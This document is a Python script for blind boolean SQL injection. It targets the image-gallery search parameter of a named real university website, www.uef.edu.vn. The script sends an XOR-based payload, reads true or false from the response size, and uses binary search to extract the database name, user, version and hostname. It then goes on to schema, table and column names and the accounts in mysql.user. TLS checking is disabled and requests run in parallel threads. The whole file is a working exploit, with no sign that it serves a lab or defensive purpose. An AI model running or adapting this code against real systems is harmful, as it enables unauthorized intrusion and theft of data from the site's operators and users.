#!/usr/bin/env python3
"""Blind SQLi CONTENT-ORACLE enumerator for www.uef.edu.vn/thu-vien-hinh-anh (txtSearch).
Payload: the0"XOR(if(<expr>,1,0))XOR"Z   TRUE -> page grows (~82KB), FALSE -> 71052 bytes.
Usage: python3 /tmp/sqli_enum2_uef.py <stage>
Stages: info | schemas | tables | columns | users
"""
import sys, time, json, threading, urllib.parse, urllib.request, http.client, re, ssl
from concurrent.futures import ThreadPoolExecutor

HOST = "www.uef.edu.vn"
PATH = "/thu-vien-hinh-anh?Trang_1&txtSearch="
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
THRESH = 75000      # bytes; >= => TRUE
WORKERS = 4
LOG = "/tmp/sqli_enum_uef.log"
JSONF = "/tmp/sqli_enum_uef.json"
lock = threading.Lock()
stats = {"req": 0, "false_streak": 0}
cache = {}
_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE
_local = threading.local()


def log(msg):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
    print(line, flush=True)
    with lock:
        with open(LOG, "a") as f:
            f.write(line + "\n")


def get_conn():
    c = getattr(_local, "conn", None)
    if c is None:
        c = http.client.HTTPSConnection(HOST, timeout=30, context=_ctx)
        _local.conn = c
    return c


def http_size(q):
    payload = 'the0"XOR(if(%s,1,0))XOR"Z' % q
    url = PATH + urllib.parse.quote(payload, safe="")
    for attempt in range(3):
        try:
            c = get_conn()
            c.request("GET", url, headers={"User-Agent": UA, "Accept": "*/*"})
            r = c.getresponse()
            body = r.read()
            with lock:
                stats["req"] += 1
            if r.status == 200:
                return len(body)
            log("HTTP %d for expr len %d, retry" % (r.status, len(q)))
            _local.conn = None
        except Exception as e:
            _local.conn = None
            if attempt == 2:
                log("HTTP_ERR %r expr=%s..." % (e, q[:60]))
    return None


def ask(expr):
    with lock:
        if expr in cache:
            return cache[expr]
    size = http_size(expr)
    if size is None:
        with lock:
            stats["false_streak"] = 0
        return False  # loi mang: coi nhu FALSE nhung khong cap nhat streak/cache
    res = size >= THRESH
    with lock:
        cache[expr] = res
        stats["false_streak"] = stats["false_streak"] + 1 if not res else 0
        streak = stats["false_streak"]
    if streak >= 12:
        log("WARN 12 consecutive FALSE - health check")
        h = http_size("1=1")
        if h is not None and h < THRESH:
            log("FATAL oracle broken: 1=1 returned %d bytes" % h)
            sys.exit(2)
        with lock:
            stats["false_streak"] = 0
        time.sleep(5)
    return res


def get_len(expr, maxlen=96):
    lo, hi = 0, maxlen
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("CHAR_LENGTH((%s))>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo


def get_char(expr, pos):
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("ASCII(SUBSTRING((%s),%d,1))>%d" % (expr, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if lo else ""


def extract(expr, label, maxlen=96):
    n = get_len(expr, maxlen)
    if n <= 0:
        log("%s: EMPTY (NULL/no access) | %s" % (label, expr))
        return ""
    chars = [""] * n
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = {ex.submit(get_char, expr, pos + 1): pos for pos in range(n)}
        for f, pos in futs.items():
            chars[pos] = f.result()
    s = "".join(chars)
    esc = s.replace("\\", "\\\\").replace("'", "\\'")
    ok = ask("BINARY (%s)='%s'" % (expr, esc))
    log("%s = %r  (verify=%s, len=%d, total_req=%d)" % (label, s, ok, n, stats["req"]))
    return s if ok else s + "  [VERIFY_FAILED]"


def num(expr, maxval=512):
    lo, hi = 0, maxval
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("(%s)>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    log("COUNT %s = %d" % (expr, lo))
    return lo


def save(key, val):
    try:
        with open(JSONF) as f:
            d = json.load(f)
    except Exception:
        d = {}
    d[key] = val
    with open(JSONF, "w") as f:
        json.dump(d, f, indent=1, ensure_ascii=False)


def stage_info():
    out = {}
    out["database()"] = extract("SELECT database()", "database()", 64)
    out["user()"] = extract("SELECT user()", "user()", 64)
    out["current_user()"] = extract("SELECT current_user()", "current_user()", 64)
    out["@version"] = extract("SELECT @@version", "@@version", 32)
    out["@version_comment"] = extract("SELECT @@version_comment", "@@version_comment", 96)
    out["@hostname"] = extract("SELECT @@hostname", "@@hostname", 64)
    save("info", out)


def stage_schemas():
    n = num("SELECT COUNT(*) FROM information_schema.schemata", 64)
    names = []
    for i in range(min(n, 20)):
        names.append(extract("SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT %d,1" % i, "schema[%d]" % i, 64))
        save("schemas", names)
    if n > 20:
        save("schemas_truncated", n)


def stage_tables():
    n = num("SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()", 512)
    names = []
    for i in range(min(n, 40)):
        t = extract("SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT %d,1" % i, "table[%d]" % i, 64)
        names.append(t)
        save("tables", names)
    if n > 40:
        save("tables_truncated", n)
        log("WARN tables count=%d, extracted first 40" % n)


def stage_columns():
    try:
        with open(JSONF) as f:
            d = json.load(f)
    except Exception:
        d = {}
    tables = [t for t in d.get("tables", []) if t]
    kw = re.compile(r"user|admin|account|member|tk|tai|quantri|hinh|image|gallery|news|article|bai|post|log|config|nguoi", re.I)
    pick = [t for t in tables if kw.search(t)]
    pick = (pick + [t for t in tables if t not in pick])[:3]
    log("COLUMN TARGETS: %s" % pick)
    out = {}
    try:
        with open(JSONF) as f:
            out = json.load(f).get("columns", {})
    except Exception:
        pass
    for t in pick:
        if t in out:
            continue
        key = "table_name='%s'" % t.replace("'", "''")
        c = num("SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND %s" % key, 128)
        cols = []
        for i in range(min(c, 30)):
            cols.append(extract("SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND %s ORDER BY ordinal_position LIMIT %d,1" % (key, i), "col[%s][%d]" % (t, i), 64))
        out[t] = cols
        save("columns", out)
        log("COLUMNS %s (%d): %s" % (t, c, cols))


def stage_users():
    out = {}
    n = num("SELECT COUNT(*) FROM mysql.user", 64)
    users, hosts = [], []
    for i in range(min(n, 8)):
        users.append(extract("SELECT user FROM mysql.user ORDER BY user LIMIT %d,1" % i, "mysql.user[%d]" % i, 48))
        save("users", {"users": users})
    for i in range(min(n, 8)):
        hosts.append(extract("SELECT host FROM mysql.user ORDER BY user LIMIT %d,1" % i, "mysql.user.host[%d]" % i, 48))
        save("users", {"users": users, "hosts": hosts})
    log("MYSQL USERS: %s" % list(zip(users, hosts)))


if __name__ == "__main__":
    stage = sys.argv[1] if len(sys.argv) > 1 else "info"
    t0 = time.time()
    log("=== STAGE %s START (content oracle, workers=%d) ===" % (stage, WORKERS))
    {"info": stage_info, "schemas": stage_schemas, "tables": stage_tables,
     "columns": stage_columns, "users": stage_users}[stage]()
    log("=== STAGE %s DONE in %.0fs, requests=%d ===" % (stage, time.time() - t0, stats["req"]))
